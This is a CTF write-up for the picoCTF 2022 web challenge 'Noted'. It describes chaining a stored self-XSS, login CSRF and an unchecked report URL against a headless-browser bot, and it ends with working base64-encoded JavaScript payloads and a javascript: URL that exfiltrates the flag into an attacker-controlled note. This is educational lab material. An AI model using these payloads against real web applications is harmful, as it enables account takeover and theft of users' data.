# picoCTF 2022 Web Exploitation "Noted" by ehhthing, 500 points
  
Self - XSS isnt too bad ? I liked this challange very much because it proves the opposite. Turning a Self-XSS into something usable was a lot of fun.

The service to attack was provided as a docker container for full source examination and local testing.
It is a little note taking app. You can register, log in, make notes and delete them. No sharing, no public area. You can also "report" 
some URL. When this is done, puppeteer simulates a chrome browser user that does the following:

1. create a new account
2. log in and save a note (this note is the Flag)
3. change the browser address to "about:blank"
4. open the given URL

The user does this always from scratch with a clean browser and a new account, username and password are long enough and random, no target here.

The server is an out of the box node/fastify. Nothing special about that and probably not the target. But let's see what I could find for my exploit toolbox: 

1. The cookie is not http-only. So it can be stolen by javascript
2. The "report" feature has zero sanity. Whatever you report here, the target user will put that into his browsers address bar and hit enter (aka puppeteer will do a page.goto(url); with whatever you specify as URL)
3. the notes lack template sanity/escaping for user generated content, so you can inject javascript into your own notes. This results in a stored self-XSS.
4. the forms for "register" and "login" do not have CSRF protection (all other POSTs do, including note creation).

And thats it, or, at least, thats is all I found. 
The Author additionaly provided three hints:

1. "Are you sure I followed all the best practices?"
2. "There's more than just HTTP(S)!"
2. "Things that require user interaction normally in Chrome might not require it in Headless Chrome."
4. The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application.

#1 isnt really a hint to me, but hey, of course not.
#2 this points out the zero sanity for the URL input. There IS more than http/https
#3 I did not get to this one. My final solution works like a charm with real chrome without additional user interaction and therefore maybe what I found here is not the indended solution.
#4 led to the assumption that the only way to acually get the flag is to either steal the cookie or the flag and write it to a note within an account with known credentials.

After I got my four tools for the Exploit bag, I thought, this can't be too hard. The competition had just started and there was not much indication on difficulty. 
But the time I solved this as #83, the next lower rated web exploit challenges already had around 3000 solves each.

My first attempt was: 

- place an XSS in a note in my acount that contains a history.go(-2)
- use a "javascript:" or "data:" URL containing a login form (no CSRF protection!) to force the "user" to login into my account
- the call history.go(-2) from the xss to bring the user back to the page where he POSTed the flag, which then should be reloaded automatically.

It was quite easy to log in the user to my account. I placed an HTML page with a prefilled form and a document.forms[0].submit() into a data:-URL and "reported" this.
I was confident that hint #3 must exactly address this: A real user would always be asked if he wants to submit again, but a headless chrome would fall for that and post the flag to my account without asking.

**It did not work.**

The "user" was navigated to the right page with the flag note shown. I did go(-3) and got the form ready to submit, but no submit. The reason was all the POST requests end with a redirect, 
and only the redirects make it into the browser history. So no POST to be redone anywhere.

But when there ist no auto-resubmit in the history, how do I make use of the data from the old session? Next try:

1. add a target="new" to the login form
2. document.forms[0].submit()  will open the app user in a new window, thus preserving the old page
3. call history.go(-2) in the current window. 
4. modify the self-xss: create an iframe and call /new within it to get a note form with a valid csrf token, then use window.parent and some javascript to grab the data from the parent window and fill and submit the form.

After history.go(-2), both the "new" window and the parent are same origin. Therefore, window.parent should be accessible the new window, which is then used by my self-xss to create a new note with the desired content. 
I tested this live by doing what the puupeter "user" does manually in firefox and it worked!

But no luck with chrome, neither headless nor regular: The popup blocker prevented any attempt to programmaticaly create a new window. An iframe also did not work, because with the origin for my data:url being about:blank, it either does nothing or, with mode: 'no-cors', does not send any credentials or cookies.

It took me _ages_ to come up with a new idea:

My prior knowledge was, to get access from a parent to a child window, you have to use the window object created on open aka _myChild = window.open("about:blank");_ No "myChild", no luck, no way to restore the link and access the object without that.

But from a ten year old stackoverflow answer to question 7243970 I learned that at least _something_ works, when you know the window.name: 
window.open("javascript:console.log('got you')" ,"myTarget") will execute the "console.log" in an already open window named "myTarget" if they share the same context, leaving the current window content otherwise untouched. 
Could this kind of remote code execution replace the need for a window object? No cliffhanger here: Yes. It does.

## The explit goes as follows.

1. prepare the selfXSS and write it to a note in a known account. Its mission is to send some javascipt for remote execution to a lateron created window called "old" that will:
    1. create an iframe containing a form for a new note by simply using src="/new"
    2. fill the form with some information found on the current document on "old" (aka the flag)
    3. submit the form
2. prepare a form to log the user into the known account
3. build a javascript: URL for the report feature. It places two commands in the adress bar:
    1. write the login form to the about:blank page (including some script that will auto-submit it after loading)
    2. execute window.open("http://0.0.0.0:8080","old");
4. use the "report" feature to "report" the prepared url.
5. wait a few seconds
6. goto /notes to find the new note with the flag.

Why this works: The window.open() in step 3.2 is done in the old context, because the javascript engine fully executes linear code before switching context and I also delayed the login. The browser opens the notes of our target user in a new window named "old", showing the note with the flag. 

Luckily this time the window.open() is not blocked by the popup blocker, because this is an interactive context (user entering an URL). Next, the browser will change the session credentials in the current window by submitting the the login form. Since we stay in the same window this time, no popup blocking. The new credentials affect both browsers windows, but the page content of "old" remains unchanged.

After login, our selfXSSed Note is shown. This page is now in the same context as the window "old" and is also its parent. Given that, we can successfully use our self-XSS to remote execute javascript in window "old". But since we changed credentials, the new note form was created with valid CSRF token and will be saved to the user currently logged in, while we can still read the old page content.

I did not need the cookie and I am still unaware what hint #3 was about. But so what, problem solved. 

I also found the headless browser, other than stated, _actually had_ internet access. But if you got far enough to be able to access the flag, calling home or placing the note does not make much of a difference.

This challenge taught me a lot about session context and communication beween windows, way more than I finally used gere to solve the puzzle. It felt like a real world scenario and made me aware of some pitfalls of javascript: and data: URLs that I would never have thought of before. Thanks to ehhthing for that.

Taus

## The Code

### Set Self-XSS for User. It sends Javascript to Window "old" that submits a form found on that page

#### Payload to be sent to "old" window before conversion to base64

    function ce(n) {
    var sc = document.createElement("iframe");
    sc.id = n;
    sc.src = "/new";
    document.body.appendChild(sc);
    };
    function ch(n, v) {
    document.getElementById("a").contentDocument.forms[0][1].value=n;
    document.getElementById("a").contentDocument.forms[0][2].value=v;
    document.getElementById("a").contentDocument.forms[0].submit();
    console.log("did it");   
    }
    setTimeout(() => ce("a"), 1000);
    setTimeout(() => ch("a", document.body.getElementsByTagName("p")[0].innerHTML), 2000);
 

#### Final self-xss, containing the payload

    <script>
    window.open("javascript:eval(atob('ZnVuY3Rpb24gY2UobikgewogdmFyIHNjID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CiBzYy5pZCA9IG47CiBzYy5zcmMgPSAiL25ldyI7CiBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjKTsKfTsKZnVuY3Rpb24gY2gobiwgdikgewogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImEiKS5jb250ZW50RG9jdW1lbnQuZm9ybXNbMF1bMV0udmFsdWU9bjsKIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJhIikuY29udGVudERvY3VtZW50LmZvcm1zWzBdWzJdLnZhbHVlPXY7CiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYSIpLmNvbnRlbnREb2N1bWVudC5mb3Jtc1swXS5zdWJtaXQoKTsKIGNvbnNvbGUubG9nKCJkaWQgaXQiKTsgICAKfQpzZXRUaW1lb3V0KCgpID0+IGNlKCJhIiksIDEwMDApOwpzZXRUaW1lb3V0KCgpID0+IGNoKCJhIiwgZG9jdW1lbnQuYm9keS5nZXRFbGVtZW50c0J5VGFnTmFtZSgicCIpWzBdLmlubmVySFRNTCksIDIwMDApOw=='));", "old");
    </script>

### Compose url for the "report"

#### Payload: Form that logs user into my account before conversion to base64
   
    <html><head><title>Page fron report URL data</title></head>
    <body>
    <h1>Login</h1>
    <form id="myForm" action="http://0.0.0.0:8080/login" method="POST">
        <input type="text" name="username" placeholder="username" value="a">
        <input type="password" name="password" placeholder="password" value="a">
        <input type="submit" value="Submit">
    </form>
    <script>
    setTimeout(() => document.getElementById("myForm").submit(),"1000");
    </script>
    </body>
    </html>

#### URL to "report", containing the above HTML
          
    javascript:document.write(atob("PGh0bWw+PGhlYWQ+PHRpdGxlPlBhZ2UgZnJvbiByZXBvcnQgVVJMIGRhdGE8L3RpdGxlPjwvaGVhZD4KPGJvZHk+CjxoMT5Mb2dpbjwvaDE+Cjxmb3JtICBpZD0ibXlGb3JtIiBhY3Rpb249Imh0dHA6Ly8wLjAuMC4wOjgwODAvbG9naW4iIG1ldGhvZD0iUE9TVCI+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHBsYWNlaG9sZGVyPSJ1c2VybmFtZSIgdmFsdWU9ImEiPgogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9InBhc3N3b3JkIiB2YWx1ZT0iYSI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4KPC9mb3JtPgo8c2NyaXB0PgpzZXRUaW1lb3V0KCgpID0+IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJteUZvcm0iKS5zdWJtaXQoKSwiMTAwMCIpOwo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cg=="));window.open("http://0.0.0.0:8080","old");
        
